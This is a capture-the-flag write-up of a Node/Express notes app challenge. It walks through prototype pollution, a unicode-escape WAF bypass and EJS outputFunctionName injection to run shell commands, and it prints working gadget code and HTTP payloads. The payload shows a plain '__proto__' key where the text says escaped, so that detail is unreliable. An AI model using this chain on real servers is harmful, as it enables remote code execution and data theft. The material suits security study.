---
doc_kind: writeup
title: "battleCTF Qualifier (bugpwn) — SwiftNotes (prototype pollution -> EJS outputFunctionName RCE)"
category: web
slug: bugpwn-swiftnotes-ejs-prototype-pollution-rce
created: 2026-11-10
status: solved
tags:
  - prototype-pollution
  - ejs
  - ssti
  - rce
  - waf-bypass
  - unicode-escape
source: "ctf.bugpwn.com — battleCTF Qualifier 2026 (challenge id 12, web, 155 pts)"
target: "144.217.91.111:3000 — Node/Express + EJS 3.1.6 templating"
---
# battleCTF Qualifier — SwiftNotes

## Challenge Summary

- A notes app rendering views with EJS (confirmed `ejs@3.1.6`, vulnerable to the
  CVE-2022-29078-class `outputFunctionName` identifier-injection gadget) behind a WAF blocking
  literal dangerous key names.
- Goal: pollute `Object.prototype` to reach EJS's compiled-template code generation and achieve
  remote command execution.

## Initial Signals

- `POST /api/settings` does `merge(user.settings, req.body)` — a classic prototype-pollution sink
  if `__proto__` survives as a literal key through to the merge call.
- A WAF blocks the literal string `__proto__` in the request — but `JSON.parse` resolves a
  **unicode-escaped** key (`"__proto__"`, i.e. `"__proto__"` written with
  escaped underscores) to the real `__proto__` property, while the WAF's literal-string match
  never sees the plain word — classic WAF-vs-parser semantic gap.

## Exploit Chain

1. **Bypass the WAF for `__proto__`**: send the key unicode-escaped in the raw JSON body to
   `POST /api/settings`; `JSON.parse` still resolves it to the real prototype, so `merge()`'s
   traversal mutates `Object.prototype` for real.
2. **Pick the gadget**: pollute `Object.prototype.outputFunctionName` with the EJS
   identifier-injection gadget (pre-3.1.10, confirmed `ejs@3.1.6`). Between sessions the WAF was
   hardened to **also** block the literal key name `outputFunctionName` — bypassed the same way,
   unicode-escaping one character of the key.
3. **Design the gadget body to actually leak output**: the obvious first attempt
   (`throw new Error(cmd_output)`, copied from the public CVE-2022-29078 PoC style) does **not**
   work here — the service runs in production mode and returns a generic `Internal Server Error`
   with no message leak; that PoC assumption was never independently verified for this target.
   Working gadget instead calls EJS's own render-buffer function `__append(...)` directly, so
   command output lands straight in the normally-rendered page body (HTTP 200):
   ```js
   x;__append((function(){try{return process.mainModule.require('child_process')
     .execSync('<cmd>').toString()}catch(e){return String(e)}})());var y
   ```
4. **`require` is not in scope** inside EJS's compiled `new Function(...)` template body
   (module-scoped, not global). Confirmed locally that `process.mainModule` is only populated
   when Node is run as a real entrypoint script (`node server.js`), not under `node -e` — matches
   how the actual challenge launches it — so `process.mainModule.require(...)` is used instead of
   a bare `require(...)`.
5. **Trigger**: `GET /notes` (or any route calling `res.render()`); `view cache: false` forces
   template recompilation so the polluted `outputFunctionName` takes effect immediately on the
   next render.
6. Command output (including the flag file's contents) comes back in the normal 200 response body.

## Key Evidence

- Local reproduction (`npm install ejs@3.1.6` in a scratch dir, call `ejs.render()` after manually
  polluting `Object.prototype`, run as a real entrypoint script) matched live target behavior
  exactly — this caught both the `Error`-throw dead end and the `require`-scope issue **before**
  spending live request/rate-limit budget on them.
- `"ReferenceError: require is not defined"` observed live, confirming the module-scope issue
  directly rather than assuming it.

## Dead Ends

- `throw new Error(cmd_output)` as the gadget body — assumed a dev-mode error handler would echo
  the message/stack; production mode returns a generic error with no leak. Never actually verify
  an exfil channel from a public PoC's style without confirming it per-target.
- Bare `require(...)` inside the gadget — undefined in the compiled template's function scope.
- `localsName` as an alternative unblocked gadget key — technically not keyword-blocked, but a
  messier gadget (used in multiple places in EJS's generated source) — not pursued once
  `outputFunctionName` was revived via the same unicode-escape trick.

## Payloads And Commands

```http
POST /api/settings HTTP/1.1
Content-Type: application/json

{"__proto__":{"outputFunctionName":
 "x;__append((function(){try{return process.mainModule.require('child_process').execSync('cat /flag*').toString()}catch(e){return String(e)}})());var y"}}
```
```http
GET /notes HTTP/1.1
```

## Flag / Outcome

- `CTF{5e038be14a277c1bf8b912e06de7d943}` — 155 pts.

## Reusable Lessons

- WAFs that block a literal key/string name are frequently bypassed by unicode-escaping a single
  character of that same string — `JSON.parse`/the JS runtime resolves the escape, the WAF's
  literal-string match does not. Worth trying as a first bypass attempt whenever a known-good
  payload gets blocked only by name, not by structure.
- Before spending live requests iterating a gadget's exact JS syntax, reproduce the *exact*
  vulnerable mechanism offline with the real vulnerable library version, run in the same execution
  mode as the target (entrypoint script vs. `-e`/REPL) — globals like `process.mainModule` differ
  between modes and this single detail turned several wasted live round-trips into one correct
  final request.
- `__append(...)` (or the template engine's own internal output-buffer function) is a reliable
  exfil channel for an RCE gadget inside a template engine when a generic error-throw doesn't leak
  anything in production mode.

## Related

- [`bugpwn-ticketvault-nosql-querystring-bypass`](bugpwn-ticketvault-nosql-querystring-bypass.md) —
  same platform, same lesson shape (a sanitizer/WAF that checks one representation of the payload
  but not an equivalent one).
